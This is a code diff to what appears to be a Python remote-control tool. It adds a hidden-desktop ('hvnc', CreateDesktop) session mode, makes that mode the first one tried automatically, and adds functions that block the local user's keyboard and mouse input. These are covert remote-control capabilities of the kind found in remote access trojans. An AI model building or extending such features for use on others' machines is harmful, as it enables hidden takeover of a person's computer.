@@ -30,6 +30,9 @@ def _normalize_mode(mode: str | None) -> str:
         return "view"
     if value in {"hidden", "hidden-manage", "hidden_manage", "hidden-desktop", "hidden_desktop"}:
         return "hidden"
+    # HVNC mode - forces true hidden desktop via CreateDesktop API
+    if value in {"hvnc", "hiddenvnc", "createdesktop"}:
+        return "hvnc"
     # Support new printwindow mode explicitly
     if value in {"printwindow", "print_window", "print-window", "pw"}:
         return "printwindow"
@@ -101,21 +104,25 @@ def build_session_resources(mode: str | None) -> SessionResources:
             set_stream_profile=_set_stream_profile,
             set_cursor_visibility=cursor_controller.set_visible,
         )
-    if normalized in {"hidden", "printwindow"}:
+    if normalized in {"hidden", "printwindow", "hvnc"}:
         # Determine which mode to use
         if normalized == "printwindow":
             session_mode = "printwindow"
+        elif normalized == "hvnc":
+            session_mode = "hvnc"
         else:
             # Check environment variable for preferred hidden mode
             env_mode = os.getenv("RC_HIDDEN_MODE", "auto").strip().lower()
-            if env_mode in {"printwindow", "pw"}:
+            if env_mode in {"hvnc", "hiddenvnc", "createdesktop"}:
+                session_mode = "hvnc"
+            elif env_mode in {"printwindow", "pw"}:
                 session_mode = "printwindow"
             elif env_mode in {"virtual_display", "vd", "driver"}:
                 session_mode = "virtual_display"
             elif env_mode in {"fallback", "legacy"}:
                 session_mode = "fallback"
             else:
-                session_mode = "auto"
+                session_mode = "auto"  # auto now tries hvnc first
         
         try:
             hidden_session = create_hidden_session(mode=session_mode)
@@ -139,6 +146,17 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 fps: int | None,
             ) -> None:
                 hidden_session.screen_track.set_profile(profile, width, height, fps)
+            
+            # Input blocking support for hidden/hvnc modes
+            def _set_input_blocking(enabled: bool) -> bool:
+                if enabled:
+                    return hidden_session.block_local_input()
+                else:
+                    hidden_session.unblock_local_input()
+                    return True
+            
+            def _get_input_blocked() -> bool:
+                return getattr(hidden_session, '_input_blocked', False)
 
             return SessionResources(
                 control_handler,
@@ -146,6 +164,8 @@ def build_session_resources(mode: str | None) -> SessionResources:
                 close=hidden_session.close,
                 launch_app=_hidden_launch_app,
                 set_stream_profile=_set_stream_profile,
+                set_input_blocking=_set_input_blocking,
+                get_input_blocked=_get_input_blocked,
             )
 
     controller = InputController()
